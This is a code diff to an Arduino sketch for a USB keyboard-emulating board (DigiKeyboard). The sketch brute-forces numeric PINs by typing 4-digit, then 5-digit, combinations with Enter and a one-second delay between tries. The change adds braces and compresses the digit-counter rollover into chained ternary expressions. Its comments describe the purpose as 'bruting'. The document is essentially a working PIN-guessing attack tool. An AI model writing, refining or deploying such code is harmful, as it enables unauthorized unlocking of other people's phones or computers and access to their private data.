@@ -32,11 +32,12 @@ void loop() {
   }
   /*Sends keystrokes based upon the values between 0-9 
   It will start bruting 5 digits if a exceeds 10*/
-  if (key_stroke_e == false)
+  if (key_stroke_e == false){
     DigiKeyboard.sendKeyStroke(num[a]);
     DigiKeyboard.sendKeyStroke(num[b]);
     DigiKeyboard.sendKeyStroke(num[c]);
     DigiKeyboard.sendKeyStroke(num[d]);
+  }
   //check for whether it is true. If so, use 5 digits instead.
   if (key_stroke_e == true){
     DigiKeyboard.sendKeyStroke(num[a]);
@@ -47,31 +48,17 @@ void loop() {
   }
   DigiKeyboard.sendKeyStroke(40);
   delay(1000);
-  d++;
   count++;
-  //If the 4th digit is past 9, it cycles back to 0 and increments the 3rd digit 
-  if(d == 10){
-    d = 0;
-    c++;
-    //If the 3rd digit is past 9, it cycles back to 0 and increments the 2nd digit
-    if(c == 10){
-      c = 0;
-      b++;
-      //If the 2nd digit is past 9, it cycles back to 0 and increments the 1st digit
-      if(b == 10){
-        b = 0;
-        a++; //if the 1st digit is past 9 it'll probably just throw out errors.
-	if(a == 10){
-	  //remain_true will equal true, loop through void(), and send the 5th keystroke
-	  key_stroke_e = true;
-	  e++;
-	  //Remember that brute forcing will still work, despite its strange order.
-	  //After e == 10, it will become 0 again.
-	  if(e == 10){
-	    e = 0;
-	  }
-	}
-      }  
-    }
-  }    
-}
+  /*Dimish the amount of lines by using ternary operators
+  This checks in order from e, a, b, c, and to d
+  Essentially, each int is conditioned. E.g. a would be assigned 0 if it equals 10 to reset.
+  If b == 10, then 'a' would increment; otherwise it would equal itself.
+  */
+  if(a==10){
+    key_stroke_e = true;
+  }
+  e = (e==10) ? 0 : (a==10 && key_stroke_e == true) ? (e + 1) : e;
+  a = (a==10) ? 0 : (b==10) ? (a + 1) : a;
+  b = (b==10) ? 0 : (c==10) ? (b + 1) : b;
+  c = (c==10) ? 0 : (d==10) ? (c + 1) : c;
+  d = (d==10) ? 0 : (d + 1);
